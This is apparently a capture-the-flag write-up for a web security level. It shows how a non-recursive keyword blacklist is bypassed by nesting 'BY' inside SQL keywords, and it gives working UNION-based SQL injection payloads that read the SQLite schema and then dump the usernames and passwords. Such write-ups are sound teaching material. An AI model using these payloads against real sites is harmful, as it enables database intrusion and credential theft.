---
layout: default
title: level02
---

Here it's like [level01](./level01.md), however, this time it uses `preg_replace` to replace keywords like *union, order, select, from, group, by* and so on.

The trick here is that it doesn't replace recursively, so if we will input: `sBYelect`, it'll remove only the *BY* but the select will still be there...

So, let's just push `BY` into all of the forbidden keywords.

- Request
> `5 UBYnion sBYelect 1,sql FBYROM sqlite_master`

- Answer:
> `CREATE TABLE users(id int(7), username varchar(255), password varchar(255))`

Okay, we can see there is also column for password, let's get all passwords and usernames:

- Request
> `5 uBYnion sBYelect gBYroup_concat(username),gBYroup_concat(password) fBYrom users`
- Answer:
> `WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`

Yay, the FLAG is found inside the passwords.

**Flag:** ***`WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`*** 
